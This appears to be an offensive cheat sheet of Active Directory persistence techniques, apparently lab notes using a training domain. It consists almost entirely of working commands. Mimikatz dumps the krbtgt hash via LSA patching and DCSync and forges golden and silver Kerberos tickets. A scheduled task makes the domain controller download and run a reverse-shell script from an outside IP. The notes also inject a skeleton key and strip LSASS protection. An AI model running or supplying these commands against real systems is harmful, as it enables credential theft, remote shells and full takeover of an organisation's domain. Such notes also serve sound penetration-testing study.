# GOLDEN TICKET

# Execute mimikatz on DC as DA to get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc

# On any machine
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff47a9d8bd66ce7efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# To use DCSync feature for getting krbtgt hash 
# DA privileges needed (or a user that has replication rights on the domain object)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz on the target DC)

# SILVER TICKET
# Much more silent than the golden ticket attack
# Using hash of the Domain Controller computer account, below command provides access to shares on the DC
Invoke-Mimikatz -Command '"kerberos:golden /domain:<domain> /sid:<SID> /target:<target> /service:CIFS /rc4:<rc4> /user:Administrator /ptt"'

# Ways of achieving command execution using Silver Tickets.
# Create a ticket for the HOST SPN which will allow us to schedule a task on the target
Invoke-Mimikatz -Command '"kerberos:golden /domain:<domain> /sid:<SID> /target:<target> /service:HOST /rc4:<rc4> /user:Administrator /ptt"'

# Schedule and execute a task
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.75:8080/Invoke-PowerShellTcp.ps1''')'"

schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"


# SKELETON KEY
# Inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA Privileges required
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local

# Now it is possible to access any machine with a valid username and password as "mimikatz"
Enter-PSSession -ComputerName dcorp-dc -credential dcorp\Administrator


# In case lsass is running as a protected process, we need mimikatz driver (mimidriv.sys)
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-


